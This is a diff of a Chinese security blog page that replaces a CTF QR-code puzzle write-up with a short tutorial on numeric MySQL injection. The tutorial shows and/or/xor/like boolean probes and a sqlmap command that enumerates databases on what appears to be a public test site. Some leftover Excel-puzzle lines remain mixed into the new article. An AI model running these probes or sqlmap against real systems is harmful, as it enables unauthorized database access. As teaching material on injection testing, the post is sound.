@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="1和0的故事, oday">
+    <meta name="keywords" content="mysql数字型, oday">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>1和0的故事 | oday</title>
+    <title>mysql数字型 | oday</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/black2729134369/black2729134369.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/black2729134369/black2729134369.github.io/libs/awesome/css/all.css">
@@ -315,7 +315,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">1和0的故事</h1>
+                    <h1 class="description center-align post-title">mysql数字型</h1>
                 </div>
             </div>
         </div>
@@ -477,19 +477,25 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>题目链接：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/216.html">https://ctf.bugku.com/challenges/detail/id/216.html</a></p>
-<p><code>描　　述: 1和0的故事</code></p>
-<p>​    <code>解题思路    </code></p>
-<p><code>拿到题给文件，是一个文本文档，打开发现是一个 25 25 25 行 25 25 25 列的文本，内容只有 0 0 0和 1 1 1  </code>    `  </p>
+                <p><code>http://test.shack2.org/mysql.jsp?id=1</code> and 1=1  正常</p>
+<p> <code>http://test.shack2.org/mysql.jsp?id=1</code> and 1=2 不正常</p>
+<p><code>引号判断</code>报错则存在漏洞</p>
+<p>  And测试</p>
+<p>and 1=1<br> and 1=2</p>
+<h5 id="Or测试"><a href="#Or测试" class="headerlink" title="Or测试"></a>Or测试</h5><p>or 1=1  报错<br> or 1=2 正确</p>
+<h5 id="Xor测试"><a href="#Xor测试" class="headerlink" title="Xor测试"></a>Xor测试</h5><p>xor 1=1 报错<br> xor 1=2 正确</p>
+<h5 id="Like测试"><a href="#Like测试" class="headerlink" title="Like测试"></a>Like测试</h5><p>like 1=1 正确<br> like 1=2报错</p>
+<h5 id="符号测试"><a href="#符号测试" class="headerlink" title="符号测试"></a>符号测试</h5><p>单引号 ‘<br> 减号 -</p>
 <p>​           </p>
-<p><img src="https://img-blog.csdnimg.cn/20210411202223952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://i.ibb.co/4MSfBWs/QQ-20211012223643.png"></p>
 <ul>
-<li><p><code>一个正方形矩阵，只有 0 0 0 和 1 1 1 ，自然先想到了二维码，由于学艺不精，暂时没有掌握Python作图的技能，但是就这样放弃吗？不不不，这里用Excel做。利用Excel的定位条件功能（用条件格式的话，思路也差不多）。</code></p>
-<p><code>首先，将文本复制粘贴进Excel中，这时会发现，所有数据挤在一列里，操作的话，应该是每个数据占一个格。 </code></p>
-<p><img src="https://img-blog.csdnimg.cn/20210411202325988.png"></p>
+<li><p><code>直接用sqlmap跑加上注入的判断复制到，如果是直接跑sqlmap的话会导致跑的速度没有那么快</code></p>
+<p><code>sqlmap -u &quot;http://test.shack2.org/mysql.jsp?id=1%20like%201=1&quot; -batch --dbs</code></p>
+<p><img src="https://i.ibb.co/TMYCHgk/LIDI0-DPR-GA-6-X4-V-AIGM.png"></p>
 </li>
-<li><p><code>在“数据选项卡”-“数据工具组”-找到分列，按照固定宽度分列。每个宽度为一个字符。</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20210411202349405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p>
+<li><p><code>查看到数据库有两个</code></p>
+</li>
+<li><p><img src="https://img-blog.csdnimg.cn/20210411202349405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p>
 <p><code>列完成以后，调整一下宽高，大约能成一个正方形就行，这里推荐行高 默认（默认高度的码，不太方，不是很容易扫出来。。现在推荐行高``15.1 ，列宽2</code></p>
 <p><img src="https://img-blog.csdnimg.cn/20210411202431619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p>
 </li>
@@ -596,7 +602,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://black2729134369.github.io/2021/02/24/misc%201%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B/">https://black2729134369.github.io/2021/02/24/misc%201%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B/</a>
+                    <a href="https://black2729134369.github.io/2021/02/24/mysql%E6%95%B0%E5%AD%97%E5%9E%8B/">https://black2729134369.github.io/2021/02/24/mysql%E6%95%B0%E5%AD%97%E5%9E%8B/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1072,12 +1078,12 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/02/24/html%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/">
+                <a href="/2021/02/24/misc%201%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B/">
                     <div class="card-image">
                         
-                        <img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1538540749,2289148129&fm=26&gp=0.jpg" class="responsive-img" alt="html语法规范">
+                        <img src="https://img-blog.csdnimg.cn/20210411202223952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70" class="responsive-img" alt="1和0的故事">
                         
-                        <span class="card-title">html语法规范</span>
+                        <span class="card-title">1和0的故事</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1090,54 +1096,6 @@
                         <span class="publish-date">
                             <i class="far fa-clock fa-fw icon-date"></i>2021-02-24
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/html/" class="post-category">
-                                    html
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/html/">
-                        <span class="chip bg-color">html</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/02/24/mysql%E6%95%B0%E5%AD%97%E5%9E%8B/">
-                    <div class="card-image">
-                        
-                        <img src="https://img-blog.csdnimg.cn/20210411202223952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70" class="responsive-img" alt="mysql数字型">
-                        
-                        <span class="card-title">mysql数字型</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-24
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1155,6 +1113,54 @@
                     
                     <a href="/tags/mlsc/">
                         <span class="chip bg-color">mlsc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/02/20/kali%E5%AE%89%E8%A3%85tools%E6%96%B9%E6%B3%95/">
+                    <div class="card-image">
+                        
+                        <img src="https://www.hualigs.cn/image/615464ef0e7ca.jpg" class="responsive-img" alt="kali安装tools">
+                        
+                        <span class="card-title">kali安装tools</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/kali/" class="post-category">
+                                    kali
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/kali/">
+                        <span class="chip bg-color">kali</span>
                     </a>
                     
                 </div>
